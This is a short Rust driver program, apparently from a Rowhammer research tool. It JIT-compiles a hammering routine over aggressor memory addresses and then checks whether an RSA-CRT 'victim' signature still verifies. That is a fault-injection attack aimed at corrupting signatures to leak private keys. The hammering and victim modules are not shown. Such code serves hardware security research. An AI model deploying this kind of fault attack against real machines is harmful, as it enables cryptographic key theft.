mod jitter;
mod memory;
mod victim;

use jitter::{FencingStrategy, FlushingStrategy, Jitter, Program};
use memory::Memory;
use rand::rngs::ThreadRng;
use victim::RsaCrt;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut memory = Memory::new();
    memory.alloc(2048);
    let mut rng = rand::thread_rng();
    let mut rsa = RsaCrt::new(&memory, &mut rng)?;

    let addr = memory.addr.unwrap() as u64;
    let aggressors: Vec<u64> = (addr..addr + 2048).collect();
    let program = Program::jit(
        170,
        FlushingStrategy::LatestPossible,
        FencingStrategy::EarliestPossible,
        &aggressors,
        true,
        32,
        120,
    );
    let result = program.unwrap().call();
    println!("{:?}", result);

    let msg = b"hello world";
    let sig = rsa.sign(msg);
    println!("Signature check: {}", rsa.verify(msg, &sig));

    memory.dealloc();
    Ok(())
}
